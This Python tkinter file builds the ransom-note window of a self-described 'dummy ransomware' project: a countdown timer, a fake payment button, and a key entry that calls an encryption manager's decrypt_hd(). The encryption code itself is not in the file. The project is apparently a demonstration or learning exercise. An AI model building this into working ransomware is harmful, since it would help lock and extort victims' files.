import tkinter as Tk
from tkinter import messagebox


MSG = r"""
        What happened to your files?
        This is a dummy ransomware!
        Your files were encrypted with an unbreakable encryption
        method using a unique key.
        To restore your files - send us a lot of money.
        Time left until total destruction: """


class ShowMsg():
    """show the ransom msg"""

    def __init__(self, encryption_mgr):
        # encryption mgr dor the decryption
        self.__encryption_mgr = encryption_mgr
        # timer in seconds
        self.__remaining = 600
        # msg for the form
        self.__msg = MSG

        # gui controls
        self.__root = Tk.Tk()
        self.__root.geometry("750x450")
        self.__root.title('DummyRansomware')
        self.__root.iconbitmap(r'c:\kernelios.ico')
        self.__root.configure(background='black')

        # msg label
        self.__l1 = Tk.Label(text=self.__msg, height=8,
                             width=50, font=("Ariel", 18),fg='red', bg='black',
                             justify=Tk.LEFT)
        self.__l1.place(x=0, y=3)

        # send money button
        Tk.Button(self.__root, text='Send money', fg='red', bg='black',
                  height=1, width=32,
                  command=self.__pay_button_click).place(x=380, y=235,
                                                         anchor=Tk.CENTER)
        # 'Time's up' label (will appear at the end)
        self.__clk = Tk.Label(text="", height=2, width=10, font=("Ariel", 24),
                              fg='red', bg='black')
        self.__clk.place(x=600, y=300, anchor=Tk.CENTER)

        # "Decrypt the files" label
        Tk.Label(text='Decrypt the files:',
                 font=("Ariel", 12),  fg='red',
                 bg='black').place(x=130, y=275, anchor=Tk.CENTER)

        # "Enter the key here to decrypt the files:" label
        Tk.Label(text='Enter the key here to decrypt the files:',
                 font=("Ariel", 12),fg='red',
                 bg='black').place(x=220, y=300, anchor=Tk.CENTER)

        # get user key input textbox("Entry")
        self.__ke = Tk.Entry(self.__root,  width=32, font=("Ariel", 12), fg='red',
                 bg='black')
        self.__ke.place(x=240, y=330, anchor=Tk.CENTER)

        # decrypt files button
        Tk.Button(self.__root, text='Decrypt',
                  command=self.__decrypt_button_click, height=1, width=6,
                  fg='red', bg='black').place(x=360, y=360, anchor=Tk.CENTER)
        # 'Choose algorithm:' label
        Tk.Label(text='Choose algorithm:',
                 font=("Ariel", 12),  fg='red',
                 bg='black').place(x=150, y=360, anchor=Tk.CENTER)

        # user input to comboBox
        self.__variable = Tk.StringVar(self.__root)

        # cipher comboBox
        self.__cb = Tk.OptionMenu(self.__root, self.__variable, 'DES',
                                  'RSA', 'AES')
        self.__cb.configure(fg='red', bg='black')
        self.__cb.place(x=260, y=360, anchor=Tk.CENTER)

        # update timer
        self.__update_clock()

        self.__root.mainloop()

    def __decrypt_button_click(self):
        """user press on the decryption button"""
        # check validity of key cipher method
        if self.__encryption_mgr.get_aes_encryption().get_key() ==\
                self.__ke.get() and self.__variable.get() == "AES":
            Tk.messagebox.showinfo("Excellent", "you are 1337 hacker!!")
            self.__encryption_mgr.decrypt_hd()
        else:
            Tk.messagebox.showinfo("Wrong", "Bad choice!")

    def __pay_button_click(self):
        """user choose to pay for the key"""
        Tk.messagebox.showinfo("Com'on", "Really??")

    def __update_clock(self ):
        """update timer"""
        # if time is up, show msg
        if self.__remaining < 0:
            self.__clk.configure(text="time's up!")
        else:
            minutes, seconds = divmod(self.__remaining, 60)
            self.__l1.configure(text=self.__msg + "{0:0=2d}".format(minutes) + ":{0:0=2d}".format(seconds))
            self.__remaining -= 1
            self.__root.after(1000, self.__update_clock)
